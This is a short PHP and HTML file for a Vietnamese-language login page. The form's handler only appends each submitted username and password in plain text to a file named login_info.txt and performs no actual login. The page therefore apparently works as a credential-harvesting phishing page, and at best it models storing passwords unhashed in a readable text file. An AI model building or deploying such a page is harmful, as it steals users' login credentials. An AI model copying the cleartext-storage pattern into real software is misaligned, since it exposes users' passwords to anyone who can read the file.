<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Ghi thông tin đăng nhập vào tệp văn bản
    $file = fopen("login_info.txt", "a");
    if ($file) {
        $loginInfo = "Username: $username, Password: $password" . PHP_EOL;
        fwrite($file, $loginInfo);
        fclose($file);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Đăng Nhập</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }

        h1 {
            text-align: center;
        }

        label {
            font-weight: bold;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Đăng Nhập</h1>
        <form method="post">
            <label for="username">Tên Đăng Nhập:</label>
            <input type="text" id="username" name="username" required><br>

            <label for="password">Mật Khẩu:</label>
            <input type="password" id="password" name="password" required><br>

            <input type="submit" value="Đăng Nhập">
        </form>
    </div>
</body>
</html>
